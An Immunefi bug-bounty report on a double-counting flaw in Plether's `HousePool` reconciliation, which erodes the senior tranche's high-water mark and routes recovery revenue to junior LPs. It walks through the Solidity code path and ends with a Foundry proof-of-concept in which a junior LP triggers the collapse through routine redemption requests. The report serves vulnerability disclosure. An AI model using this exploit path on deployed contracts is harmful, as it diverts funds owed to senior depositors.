# \#99353 [SC-High] Double-counting of the pending recapitalization residual in `HousePool` reconciliation collapses the senior high-water mark, permanently diverting senior LPs' protected recovery revenue to junior LPs

**Submitted on Nov 13th 2026 at 10:37:46 UTC by @godwinudo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99353
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value
  - Theft of unclaimed yield

## Description

## Brief/Intro

When the owner recapitalizes a `HousePool` whose trader claims exceed its cash, only part of the recapitalization is backed. The first reconcile credits the backed part to senior principal, sets the senior high-water mark (HWM) to the full recapitalization, and leaves the unbacked remainder in `pendingRecapitalizationAssets`. Every later reconcile reserves that residual against gross distributable value, but that value is the same cash already credited to senior principal. The waterfall reads the double reservation as a loss, wipes senior principal to zero, and re-bootstraps senior with the HWM overwritten from the shrunken residual. With no economic event, each permissionless `settleLpEpoch` lowers the senior HWM by the backed amount, until up to the whole deficit-sized recovery target is gone. From then on, recovery revenue that the waterfall should use to restore senior is paid to junior LPs instead.

## Vulnerability Details

`HousePool` tracks what the two LP tranches own with `seniorPrincipal`, `juniorPrincipal` and `seniorHighWaterMark`. The HWM is senior's protected entitlement: the amount future revenue must restore before junior receives anything. The accounting specification defines the reconciliation rules as follows (`ACCOUNTING_SPEC.md`, "Senior/Junior waterfall and coupon", emphasis added):

> `seniorHighWaterMark` records the Senior entitlement that future revenue must restore after a loss. With both tranches owned, reconciliation applies these rules:
> 2. Compare terminal equity, excluding reserved pending claimant inflows and `unassignedAssets`, with total principal.
> 3. Charge a shortfall to Junior first, then Senior. **Losses do not reduce the Senior high-water mark.**
> 4. Route surplus first to restore Senior principal to its high-water mark, then to Junior.
> 5. Route pending recapitalization and trading-revenue buckets according to their explicit ownership intent, described below. **Reserving them in step 2 prevents counting the same inflow twice.**

`SECURITY.md` lists the same property as a protocol invariant: "High-water-mark protection | Senior impairment must be restored before junior extracts surplus".

Recapitalization is the documented recovery action for an impaired pool. `CfdEngine.recapitalizePool(amountAssets)` pulls USDG from the owner's wallet into the pool and records it as a `Recapitalization` claimant inflow (`SECURITY.md`: "The pool queues claimant allocation for normal reconciliation; no shares are minted and degraded mode is not automatically cleared."). The pool does not allocate the cash immediately. It queues it:

```solidity
// HousePool.sol — recordClaimantInflow
if (cashMode == IHousePool.ClaimantInflowCashMode.CashArrived) {
    accountedAssets += amount;
}

if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
    _recordPendingClaimantInflow(kind, amount);
} else if (seniorPrincipal + juniorPrincipal == 0) {
    _recordPendingClaimantInflow(kind, amount);
}
```

The queued bucket is consumed by `_reconcile`. It caps the bucket to what is currently "settleable", reserves that settleable part out of distributable value, runs the waterfall, and then applies the settleable part as recapitalization intent:

```solidity
// HousePool.sol — _reconcile (L1555-1599)
HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot =
    HousePoolAccountingLib.buildReconcileSnapshot(accountingSnapshot);
HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets = _getPendingClaimantBuckets();
HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets =
    _settleablePendingClaimantBuckets(reconcileSnapshot, claimantBuckets);
bool allowRevenueContinuation = seniorPrincipal + juniorPrincipal != 0;
HousePoolReconcilePlanLib.ReconcilePlan memory plan = HousePoolReconcilePlanLib.planReconcile(
    _currentPendingAccountingState(),
    reconcileSnapshot,
    _pendingClaimantBucketAssets(settleableClaimantBuckets),
    poolConfig.seniorRateBps,
    couponElapsed,
    markFresh
);
...
_setWaterfallState(plan.state.waterfall);
unassignedAssets = plan.state.unassignedAssets;
...
_applyPendingClaimantBucketsLive(settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation);
```

The settleable amount is the pending bucket capped by **gross** distributable value, which is physical assets minus trader claims plus the signed terminal price delta (`HousePoolAccountingLib.buildReconcileSnapshot`):

```solidity
// HousePool.sol — L1829
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
}
```

`planReconcile` then subtracts that amount from distributable value before comparing it with claimed principal, on the assumption (stated in its natspec) that the bucket is "already represented in `snapshot.distributable` and therefore reserved from ordinary waterfall reconciliation":

```solidity
// libraries/HousePoolReconcilePlanLib.sol — planReconcile
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}
...
if (plan.claimedEquityZero) {
    ...
    HousePoolPendingPreviewLib.applyRevenueIntent(plan.state, seededDistributableToClaims);
    return plan;
}

uint256 distributableToClaims = snapshot.distributable > plan.state.unassignedAssets
    ? snapshot.distributable - plan.state.unassignedAssets
    : 0;
HousePoolWaterfallAccountingLib.ReconcilePlan memory waterfallPlan =
    HousePoolWaterfallAccountingLib.planReconcile(
        plan.state.waterfall.seniorPrincipal, plan.state.waterfall.juniorPrincipal, distributableToClaims
    );
...
if (plan.deltaAssets > 0) {
    plan.state.waterfall = HousePoolWaterfallAccountingLib.absorbLoss(plan.state.waterfall, plan.deltaAssets);
    return plan;
}
```

The settleable recapitalization is then applied by `applyClaimantRecapitalizationIntent`. If both principals are zero, this is a bootstrap, and the HWM is **assigned** (not raised) from `recapitalizationTargetAssets`. That value is the full outstanding pending recapitalization bucket, passed in by `applyPendingClaimantBucketsPreview` as `claimantIntentBuckets.recapitalizationAssets`:

```solidity
// libraries/HousePoolPendingPreviewLib.sol — applyPendingClaimantBucketsPreview
if (claimantBuckets.recapitalizationAssets > 0) {
    applyClaimantRecapitalizationIntent(
        state, claimantBuckets.recapitalizationAssets, claimantIntentBuckets.recapitalizationAssets
    );
    ...
}

// libraries/HousePoolPendingPreviewLib.sol — L111
/// @param recapitalizationTargetAssets Full recapitalization intent used as the high-water mark on an empty bootstrap.
function applyClaimantRecapitalizationIntent(
    PendingAccountingState memory state,
    uint256 amount,
    uint256 recapitalizationTargetAssets
) internal pure {
    uint256 remaining = amount;
    if (state.seniorSupply > 0) {
        if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
            state.waterfall.seniorPrincipal += remaining;
            state.waterfall.seniorHighWaterMark =
                recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
            remaining = 0;
        } else {
            uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
                ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
                : 0;
            ...
        }
    }
    ...
}
```

Now take a pool whose trader claims exceed its cash by a deficit `D`. Both tranches have been wiped, but their shares still exist. The owner recapitalizes `R > D`, and the trader's claim is paid out of that cash, so the pool holds only the backed cushion `B = R − D`, with no claims and no positions. On the first reconcile, gross distributable is `B` and the pending bucket is `R`, so settleable = `min(R, B) = B`. `planReconcile` reserves `B`, leaving `0` for the waterfall, and the old principals are written down to zero. The recapitalization intent then bootstraps senior: `seniorPrincipal = B` and `seniorHighWaterMark = max(R, B) = R`. `pendingRecapitalizationAssets` falls to `R − B = D`. So far this is the intended behaviour, and the project's own test asserts it (`test/perps/accounting/waterfall/HousePoolWaterfall.t.sol:200-201`):

```solidity
assertEq(pool.seniorPrincipal(), settleableAmount, "Live reconcile should apply only the settleable recap");
assertEq(pool.seniorHighWaterMark(), pendingAmount, "Residual recap should preserve senior's recovery target");
```

The flaw is in what happens on the **next** reconcile. Nothing economic has changed. Gross distributable is still `B`, but those `B` dollars are now the backing of `seniorPrincipal = B`. The residual `D` has no backing at all. Yet `_settleablePendingClaimantBuckets` caps the residual against gross distributable rather than against distributable net of principal already claimed, so settleable = `min(D, B)`. Whenever `D ≥ B` (any recapitalization up to twice the deficit), settleable = `B`. `planReconcile` reserves `B` again, `distributableToClaims` becomes `0`, and the waterfall sees claimed equity of `B` against zero distributable, which it books as a loss of `B`:

```solidity
// libraries/HousePoolWaterfallAccountingLib.sol — absorbLoss
/// @dev ... The senior high-water mark is deliberately unchanged so future revenue continues to restore senior impairment.
function absorbLoss(
    WaterfallState memory state,
    uint256 lossAssets
) internal pure returns (WaterfallState memory nextState) {
    nextState = state;
    if (lossAssets <= nextState.juniorPrincipal) {
        nextState.juniorPrincipal -= lossAssets;
        return nextState;
    }

    uint256 seniorLoss = lossAssets - nextState.juniorPrincipal;
    nextState.juniorPrincipal = 0;
    if (nextState.seniorPrincipal > seniorLoss) {
        nextState.seniorPrincipal -= seniorLoss;
    } else {
        nextState.seniorPrincipal = 0;
    }
}
```

`absorbLoss` leaves the HWM at `R` as designed. But both principals are now zero, so `_applyPendingClaimantBucketsLive` re-enters the bootstrap branch of `applyClaimantRecapitalizationIntent` with `amount = B` and `recapitalizationTargetAssets` equal to the **current** pending bucket, which has already shrunk to `D`. Senior principal is restored to `B`, but the HWM is overwritten with `max(D, B) = D`, and the pending bucket falls to `D − B`. In one reconcile, with no cash movement, no claim change and no price change, senior's protected recovery target drops from `R` to `D`, a reduction of `B`. The "loss" that removed `B` of senior principal was the same backing reserved a second time, and the bootstrap that followed silently reset the HWM. That breaks both spec rules quoted above: the inflow is counted twice, and a (phantom) loss reduces the senior HWM.

The collapse also repeats. While the residual is still at least `B`, the next reconcile again settles `B`, books another phantom loss of `B`, and re-bootstraps with the HWM set to the new, smaller residual. Each reconcile therefore lowers the HWM by `B`, until the residual drops below `B`. The final HWM is `R − floor(D/B)·B`, which always lands between `B` and `2B`. Senior loses between `D − B` and `D` of protected recovery: for a deep deficit, almost the entire deficit portion of the recapitalization. For example, with `R = 1,000,000` and `D = 900,000` USDG, the first reconcile sets the HWM to 1,000,000, and the next nine each lower it by 100,000, down to 100,000, which is exactly senior's principal. Senior is left with no impairment for future revenue to restore.

Future revenue then follows the corrupted HWM. `distributeRevenue` restores senior only up to its stored HWM and sends the rest to junior:

```solidity
// libraries/HousePoolWaterfallAccountingLib.sol — distributeRevenue
if (remaining > 0 && nextState.seniorPrincipal < nextState.seniorHighWaterMark) {
    uint256 deficit = nextState.seniorHighWaterMark - nextState.seniorPrincipal;
    uint256 restore = remaining < deficit ? remaining : deficit;
    nextState.seniorPrincipal += restore;
    remaining -= restore;
}
...
nextState.juniorPrincipal += remaining;
```

With the HWM intact, up to `R − B = D` of recovery revenue would go to senior first. After the collapse, that revenue goes to junior. This contradicts the design the pool itself declares. The natspec of `applyClaimantRecapitalizationIntent` describes `recapitalizationTargetAssets` as the "Full recapitalization intent used as the high-water mark". The project's own test expects senior to end at the full recapitalization once backing returns: "Residual recap should settle once backing becomes available" (`HousePoolWaterfall.t.sol:217`). And the remediation note for Cecuro MED-12 states that "partial-settlement residuals stay reserved". Under this bug the residual is not held in reserve against new backing. It is applied again on each reconcile against value that already backs senior principal.

Once its precondition exists, triggering the bug needs no special action. The precondition is a pool whose trader claims exceed its cash, which is the state the protocol explicitly anticipates and ships tooling for. The whitepaper (§2.3, "What the envelope does not prove") describes how sequential settlements realize it: "if Long closes at p=0 and is credited 1, then Short remains open and later closes at p=2, cumulative realized price-PnL obligations equal 2. The second obligation may be a trader claim rather than an immediate cash payment." The protocol then latches degraded mode, and `SECURITY.md` lists the owner's recovery runbook: "recapitalize the pool from the owner's wallet, clear degraded mode once raw solvency is restored". After degraded mode is cleared, `_reconcile` runs on every LP epoch settlement:

```solidity
// HousePool.sol — _settleLpEpoch (L824-835)
_requireWithdrawalsLive(statusSnapshot);
_requireFreshMark(accountingSnapshot, statusSnapshot);

_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();
```

Settlement is permissionless through the Router, which installs the keeper-supplied Pyth basket and calls the pool in the same frame:

```solidity
// router/OrderLiquidationBatchLogic.sol — settleLpEpoch (L549)
IPletherOracle.PriceSnapshot memory snapshot =
    oracle.updatePrice{value: pythFee}(msg.sender, pythUpdateData, IPletherOracle.PriceMode.PoolReconcile);
host.engine().updateMarkPrice(snapshot.markPrice, snapshot.publishTime);
// ...followed by an assembly call to HousePool.settleLpEpoch(markPrice, publishTime) (abridged)
```

A settlement that advances no queue item reverts, so each reconcile needs one matured LP request. After an insolvency, LPs can be expected to queue redemption requests, so in practice the first settlement after the runbook records the HWM at `R` and the next one starts the collapse. A junior holder, who benefits from the collapse, can also guarantee it for only the gas cost by queuing an ordinary full-balance redemption of their zero-value shares each epoch; it is refunded, and the shares come back. The recapitalization amount does not prevent it either: any recapitalization `R ≤ 2D` triggers the collapse. Only a recapitalization of more than twice the deficit settles cleanly on the second reconcile.

## Impact Details

The impact is a permanent transfer of value from senior LPs to junior LPs, the exact outcome the senior tranche's high-water mark exists to prevent. When the owner recapitalizes an insolvent pool, senior's protected recovery target is set to the full recapitalization `R`, so future trading revenue must first restore senior from the backed amount `B` up to `R`. The double reservation erases between `D − B` and `D` of that target over a few routine epoch settlements, where `D` is the deficit covered by the recapitalization. No cash moves and no loss occurs. Every dollar of later recovery revenue in that range is then credited to junior principal (junior shares survive a wipe) and becomes redeemable by junior holders instead of senior holders. 


## Proof of Concept

## Proof of Concept


The test asserts:
- The first settlement matches the spec and the project's own test: senior principal = 167,218.10 and HWM = 334,436.20.
- The second settlement, with pool cash, claims and price unchanged, collapses the HWM to 167,218.10.
- After a retail trader's ordinary losing trade adds 5,122.50 USDG of revenue and both LPs fully redeem to their wallets, the senior LP receives 167,217.77 USDG instead of the 172,340.25 USDG the spec entitles them to. The junior LP, whose intended payout is 0, receives 5,122.41 USDG.

The expected values are computed from the spec rule (losses never lower the HWM, so revenue below the senior gap belongs to senior), not from the code under test.

Create a file at `packages/perps/test/perps/audit/Judge_RecapHwmCollapseE2E.t.sol`, paste in the code below, and run with:

```bash
forge test --root packages/perps --match-path "test/perps/audit/Judge_RecapHwmCollapseE2E.t.sol" -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// @notice End-to-end PoC: a partially backed recapitalization's senior high-water mark collapses on the next
///         permissionless LP-epoch settlement, and later recovery revenue is paid to junior instead of senior.
/// @dev Full local protocol stack from BasePerpTest (real Engine, planner/settlement sidecars, HousePool, TrancheVaults,
///      MarginClearinghouse, OrderRouter + sidecars, PletherOracle, TerminalNavBookV2). Pyth is the only mocked
///      external dependency; prices change only by staging a Pyth publication that keepers submit through
///      `OrderRouter.executeOrder` / `OrderRouter.settleLpEpoch`. Economics are the v2.0.0 release values
///      (script/DeployPerpsArbitrumSepolia.s.sol:_riskParams, deployments/releases/2026-10-28-...-v2.0.0/manifest.json).
///      No vm.store / etch / mockCall / stdstore touches in-scope contracts.
contract Judge_RecapHwmCollapseE2ETest is BasePerpTest {

    // ---- Release configuration (v2.0.0 manifest) ----
    uint256 internal constant RELEASE_SEED_ASSETS = 1e6;
    uint256 internal constant RELEASE_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant RELEASE_MAX_SENIOR_SHARE_BPS = 8000;

    // ---- Actors ----
    address internal constant SENIOR_LP = address(0x5E1); // victim
    address internal constant JUNIOR_LP = address(0xBAD); // attacker / beneficiary (fresh, unprivileged)
    address internal constant LONG_TRADER = address(0x10A6);
    address internal constant SHORT_TRADER = address(0x5407); // hedged whale: holds the losing leg through the first move
    address internal constant RETAIL_TRADER = address(0x2E7A);
    address internal constant KEEPER = address(0xC0FFEE);

    // ---- Scenario sizes ----
    uint256 internal constant LP_DEPOSIT_ASSETS = 500_000e6;
    uint256 internal constant BOOK_CHUNK_SIZE = 300_000e18; // per-side chunks keep skew under the 40% cap
    uint256 internal constant BOOK_CHUNKS = 3;
    uint256 internal constant LONG_TRADER_FUNDING = 100_000e6;
    uint256 internal constant LONG_MARGIN_PER_CHUNK = 5_000e6;
    uint256 internal constant SHORT_TRADER_FUNDING = 700_000e6;
    uint256 internal constant SHORT_MARGIN_PER_CHUNK = 190_000e6;
    uint256 internal constant RETAIL_FUNDING = 20_000e6;
    uint256 internal constant RETAIL_MARGIN = 10_000e6;
    uint256 internal constant RETAIL_SIZE = 30_000e18;
    uint256 internal constant RECAP_MULTIPLE_OF_DEFICIT = 2; // largest recap that still triggers: R <= 2 * deficit

    // ---- Price path (8 decimals): WHITEPAPER.md section 2.3 sequential-settlement counterexample ----
    uint256 internal constant PRICE_OPEN = 1e8;
    uint256 internal constant PRICE_LONG_EXIT = 0.4e8;
    uint256 internal constant PRICE_SHORT_EXIT = 1.7e8;
    uint256 internal constant PRICE_RECOVERY_EXIT = 1.87e8;

    // ---- Timing ----
    uint256 internal constant HOURS_BETWEEN_PRICE_LEGS = 4 hours; // same FX trading session
    uint256 internal constant KEEPER_LAG = 60;
    uint256 internal constant RETAIL_HOLD = 1 hours;

    // ---- Rounding bounds ----
    uint256 internal constant SENIOR_ROUNDING_ATOMS = 10;
    uint256 internal constant JUNIOR_REL_TOLERANCE = 0.0001e18; // 0.01%: covenant-limited dust left unfunded

    uint256 internal clientNonce;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return RELEASE_SEED_ASSETS;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return RELEASE_SEED_ASSETS;
    }

    function setUp() public override {
        super.setUp();
        // Owner restores the release senior caps through the documented 72h pool-config timelock.
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = RELEASE_MAX_SENIOR_EXPOSURE_ASSETS;
        config.maxSeniorShareBps = RELEASE_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
    }

    function test_E2E_PartialRecapCollapsesSeniorHwmAndRoutesRecoveryToJunior() public {
        // 1. LPs enter through the async vault flow; each epoch is settled by a keeper via the public Router.
        _lpDeposit(juniorVault, JUNIOR_LP, LP_DEPOSIT_ASSETS);
        _lpDeposit(seniorVault, SENIOR_LP, LP_DEPOSIT_ASSETS);
        assertEq(settlementToken.balanceOf(SENIOR_LP), 0);
        assertEq(settlementToken.balanceOf(JUNIOR_LP), 0);

        // 2. Traders fund margin and build a balanced book at 1.00 through Router commit -> keeper execute.
        _fundMargin(LONG_TRADER, LONG_TRADER_FUNDING);
        _fundMargin(SHORT_TRADER, SHORT_TRADER_FUNDING);
        for (uint256 i; i < BOOK_CHUNKS; ++i) {
            _trade(LONG_TRADER, CfdTypes.Side.LONG, BOOK_CHUNK_SIZE, LONG_MARGIN_PER_CHUNK, false, PRICE_OPEN);
            _trade(SHORT_TRADER, CfdTypes.Side.SHORT, BOOK_CHUNK_SIZE, SHORT_MARGIN_PER_CHUNK, false, PRICE_OPEN);
        }

        // 3. Sequential-settlement path: Long exits at 0.40, Short later exits at 1.70. The pool cannot pay the
        //    second winner; the Engine books a trader claim and latches degraded mode -> real terminal deficit.
        vm.warp(vm.getBlockTimestamp() + HOURS_BETWEEN_PRICE_LEGS);
        assertFalse(engine.isOracleFrozen(), "live market");
        _trade(LONG_TRADER, CfdTypes.Side.LONG, BOOK_CHUNK_SIZE * BOOK_CHUNKS, 0, true, PRICE_LONG_EXIT);
        vm.warp(vm.getBlockTimestamp() + HOURS_BETWEEN_PRICE_LEGS);
        assertFalse(engine.isOracleFrozen(), "live market");
        _trade(SHORT_TRADER, CfdTypes.Side.SHORT, BOOK_CHUNK_SIZE * BOOK_CHUNKS, 0, true, PRICE_SHORT_EXIT);
        assertTrue(engine.degradedMode(), "insolvency latched degraded mode");
        uint256 poolCashAtDeficit = settlementToken.balanceOf(address(pool));
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        assertGt(claims, poolCashAtDeficit, "terminal deficit: trader claims exceed pool cash");
        uint256 deficit = claims - poolCashAtDeficit;

        // 4. Attacker queues an ordinary junior redemption (allowed while degraded) so the next epoch has a head.
        uint256 attackerShares = juniorVault.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        uint256 redeemId = juniorVault.requestRedeem(attackerShares, JUNIOR_LP, JUNIOR_LP);

        // 5. Documented owner runbook: recapitalize from the owner wallet, the trader collects the claim,
        //    the owner clears degraded mode. Recap = 2 x deficit, so the backed cushion equals the deficit.
        uint256 recap = RECAP_MULTIPLE_OF_DEFICIT * deficit;
        uint256 backed = recap - deficit;
        settlementToken.mint(address(this), recap);
        settlementToken.approve(address(engine), recap);
        engine.recapitalizePool(recap);
        vm.prank(SHORT_TRADER);
        engine.settleTraderClaim(SHORT_TRADER);
        engine.clearDegradedMode();
        assertEq(settlementToken.balanceOf(address(pool)), backed, "pool holds only the backed cushion");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no liabilities remain");

        // 6. Epoch settlement #1 (permissionless keeper via Router): matches the spec and the project's own test.
        _nextEpoch();
        _settleEpoch(PRICE_SHORT_EXIT);
        assertEq(pool.seniorPrincipal(), backed, "senior credited with the backed part");
        assertEq(pool.seniorHighWaterMark(), recap, "senior recovery target = full recapitalization");
        assertEq(pool.pendingRecapitalizationAssets(), deficit, "unbacked residual stays pending");

        // 7. Attacker reclaims the refunded (zero-NAV) shares and queues another ordinary redemption.
        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeemRefund(redeemId, JUNIOR_LP, JUNIOR_LP);
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
        attackerShares = juniorVault.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        redeemId = juniorVault.requestRedeem(attackerShares, JUNIOR_LP, JUNIOR_LP);

        // 8. Epoch settlement #2: no cash, claim or price-PnL change, yet senior's HWM collapses R -> D.
        uint256 poolCashBefore2 = settlementToken.balanceOf(address(pool));
        _nextEpoch();
        _settleEpoch(PRICE_SHORT_EXIT);
        assertEq(settlementToken.balanceOf(address(pool)), poolCashBefore2, "no cash moved");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no liability changed");
        assertEq(pool.seniorPrincipal(), backed, "senior principal unchanged");
        assertEq(pool.seniorHighWaterMark(), deficit, "HWM collapsed from 2D to D");
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeemRefund(redeemId, JUNIOR_LP, JUNIOR_LP);

        // 9. Recovery: an ordinary retail long loses on a +10% move; its loss is LP trading revenue.
        _fundMargin(RETAIL_TRADER, RETAIL_FUNDING);
        uint256 poolCashBeforeRecovery = settlementToken.balanceOf(address(pool));
        _trade(RETAIL_TRADER, CfdTypes.Side.LONG, RETAIL_SIZE, RETAIL_MARGIN, false, PRICE_SHORT_EXIT);
        vm.warp(vm.getBlockTimestamp() + RETAIL_HOLD);
        _trade(RETAIL_TRADER, CfdTypes.Side.LONG, RETAIL_SIZE, 0, true, PRICE_RECOVERY_EXIT);
        uint256 recoveryRevenue = settlementToken.balanceOf(address(pool)) - poolCashBeforeRecovery;
        assertGt(recoveryRevenue, 0);
        // Spec: losses never lower the HWM, so the intended gap is (recap - backed) = deficit; revenue fills it first.
        assertLt(recoveryRevenue, recap - backed, "all revenue belongs to senior under the intended HWM");

        // 10. Both LPs redeem everything in the same epoch (senior is funded first) and claim to their wallets.
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN());
        uint256 victimShares = seniorVault.balanceOf(SENIOR_LP);
        uint256 seniorSupply = seniorVault.totalSupply();
        vm.prank(SENIOR_LP);
        uint256 seniorRedeemId = seniorVault.requestRedeem(victimShares, SENIOR_LP, SENIOR_LP);
        attackerShares = juniorVault.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        redeemId = juniorVault.requestRedeem(attackerShares, JUNIOR_LP, JUNIOR_LP);
        uint256 poolCashBeforeExit = settlementToken.balanceOf(address(pool));
        _nextEpoch();
        _settleEpoch(PRICE_RECOVERY_EXIT);
        uint256 seniorClaimable = seniorVault.claimableRedeemRequest(seniorRedeemId, SENIOR_LP);
        vm.prank(SENIOR_LP);
        seniorVault.claimRedeem(seniorRedeemId, seniorClaimable, SENIOR_LP, SENIOR_LP);
        uint256 juniorClaimable = juniorVault.claimableRedeemRequest(redeemId, JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        juniorVault.claimRedeem(redeemId, juniorClaimable, JUNIOR_LP, JUNIOR_LP);

        // 11. Impact, against values computed from the spec rather than from the reconcile code path.
        uint256 victimReceived = settlementToken.balanceOf(SENIOR_LP);
        uint256 attackerReceived = settlementToken.balanceOf(JUNIOR_LP);
        uint256 victimExpected = (backed + recoveryRevenue) * victimShares / seniorSupply;
        uint256 victimActualIfCollapsed = backed * victimShares / seniorSupply;
        assertApproxEqAbs(victimReceived, victimActualIfCollapsed, SENIOR_ROUNDING_ATOMS, "senior got no revenue");
        assertApproxEqAbs(
            victimExpected - victimReceived,
            recoveryRevenue * victimShares / seniorSupply,
            SENIOR_ROUNDING_ATOMS,
            "victim loses the whole recovery revenue"
        );
        assertApproxEqRel(attackerReceived, recoveryRevenue, JUNIOR_REL_TOLERANCE, "attacker gets senior's revenue");
        // Intended junior payout is zero (revenue < senior gap); attacker cost is gas only (Pyth fee is zero).
        assertLe(settlementToken.balanceOf(address(pool)), poolCashBeforeExit - victimReceived - attackerReceived);
        // Senior's protected recovery permanently lost: every future revenue dollar up to `deficit` goes to junior.
        assertEq(recap - deficit, deficit);
    }

    // ---------------------------------------------------------------------------------------------------------
    // Public-interface helpers (no state writes on in-scope contracts)
    // ---------------------------------------------------------------------------------------------------------

    function _publishPyth(
        uint256 price
    ) internal returns (bytes[] memory update) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), SafeCast.toInt64(SafeCast.toInt256(price)), 0, int32(-8), publishTime, publishTime - 1
        );
        update = new bytes[](1);
        update[0] = abi.encode(price);
    }

    function _settleEpoch(
        uint256 price
    ) internal {
        bytes[] memory update = _publishPyth(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(update);
    }

    function _nextEpoch() internal {
        vm.warp(pool.lpEpochStart(pool.currentLpEpoch() + 1) + KEEPER_LAG);
    }

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 id = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(id) + KEEPER_LAG);
        _settleEpoch(PRICE_OPEN);
        vm.prank(lp);
        vault.claimDeposit(id, assets, lp, lp);
    }

    function _fundMargin(
        address trader,
        uint256 amount
    ) internal {
        settlementToken.mint(trader, amount);
        vm.startPrank(trader);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(trader, amount);
        vm.stopPrank();
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        uint256 window = router.maxExecutionWindowSeconds();
        bool acceptHigh = (side == CfdTypes.Side.LONG) == isClose;
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(++clientNonce),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: acceptHigh ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory update = _publishPyth(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

}
```

